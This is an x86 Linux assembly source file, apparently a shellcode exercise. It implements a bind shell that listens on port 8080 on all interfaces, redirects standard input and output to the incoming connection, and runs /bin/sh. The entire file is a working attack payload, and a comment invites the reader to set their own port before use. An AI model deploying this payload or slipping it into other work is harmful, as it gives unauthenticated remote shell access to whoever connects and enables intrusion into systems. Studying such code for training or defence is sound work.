; bind_shell.asm
; Author: German Namestnikov

global _start

section .text
_start:
    ; int socket(int domain, int type, int protocol);
    xor eax, eax
    xor ebx, ebx
    xor esi, esi

    mov al, 0x66       ; SYS_SOCKETCALL
    inc ebx            ; SYS_SOCKET

    push esi                  ; protocol = 0
    push dword 0x01                  ; type = SOCK_STREAM
    push dword 0x02           ; domain = AF_INET

    mov ecx, esp        ; ecx -> params 

    int 0x80            

    xor edx, edx
    xchg edx, eax        ; save socket descriptor    


    ; int bind(int sockfd, const struct sockaddr *addr,
    ;            socklen_t addrlen);
    mov al, 0x66       ; SYS_SOCKETCALL
    inc ebx            ; SYS_BIND
       
    ; struct sockaddr_in {
    push esi                ; sin_addr = htons(0.0.0.0)
    push word 0x901f        ; sin_port = htons(8080) = 0x901f <------ place your port in 
                            ;                                         big-endian here
    push word bx            ; sin_family = AF_INET (0x0002)
    ; };
    
    mov ecx, esp       	; ecx -> sockaddr_in addr
    
    push dword 0x10     ; addrlen = 16
    push ecx            ; sockaddr_in* addr
    push edx            ; sockfd
    
    mov ecx, esp        ; ecx -> params

    int 0x80
   

    ; int listen(int sockfd, int backlog);
    xor eax, eax
    mov al, 0x66
    mov bl, 0x04

    push esi            ; backlog
    push edx		; sockfd

    mov ecx, esp        ; ecx -> params

    int 0x80

    
    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
    xor eax, eax
    mov al, 0x66
    inc ebx

    push esi            ; *addrlen = NULL
    push esi	        ; *addr = NULL
    
    push edx		; sockfd 

    int 0x80
    
    xchg ebx, eax 	; ebx = accept_descriptor


    ; int dup2(int oldfd, int newfd);
    ; int dup2(accept_descriptor, STDERR/STDOUT/STDIN)
    xor eax, eax
    xor ecx, ecx
   
    mov cl, 0x02
    dup2_call:
        mov al, 0x3f
    
        int 0x80    
        dec ecx
        
        jns dup2_call
    

    ; int execve(const char *filename, char *const argv[],
    ;              char *const envp[]);
    
    push esi                    ; NULL-terminator for '/bin//sh'	
    push dword 0x68732f2f	; push "hs//"
    push dword 0x6e69622f	; push "nib/"
   
    mov ebx, esp	; EBX points to the '/bin//sh', 0x00 string 

    xor ecx, ecx 	; Set 0 all other params
    xor edx, edx        ; for SYS_EXECVE
    
    xor eax, eax
    mov al, 0x0b 	; SYS_EXECVE CODE

    int 0x80       

